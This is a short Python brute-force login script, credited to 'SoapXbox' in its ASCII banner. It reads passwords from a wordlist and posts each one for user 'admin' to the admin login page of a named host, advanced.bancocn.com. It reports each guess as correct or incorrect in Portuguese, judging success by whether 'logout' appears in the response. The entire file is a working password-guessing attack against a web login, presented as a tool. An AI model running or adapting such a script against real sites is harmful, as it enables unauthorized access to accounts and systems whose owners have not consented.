import requests


print(" _   _ _____ _____ ____  ")
print("| | | |_   _|_   _|  _ \ ")
print("| |_| | | |   | | | |_) |")
print("|  _  | | |   | | |  __/ ")
print("| | | | | |   | | | |   ")
print("|_| |_| |_|   |_| |_|   ")
print(" ")
print("              Brute force Login")
print("                    by SoapXbox")
print(" ")
print(" ")
print("--------------------------------")
print(" ")

with open("wordlist.txt", "r") as file:
    wordlist = file.read().splitlines()
    
    for word in wordlist:
        data = {"user" : "admin", "password" : word}
        response = requests.post("http://advanced.bancocn.com/admin/index.php", data = data)
        if "logout" in response.text:
            print("senha {} ok".format(word))
        else:
            print("senha {} incorreta".format(word))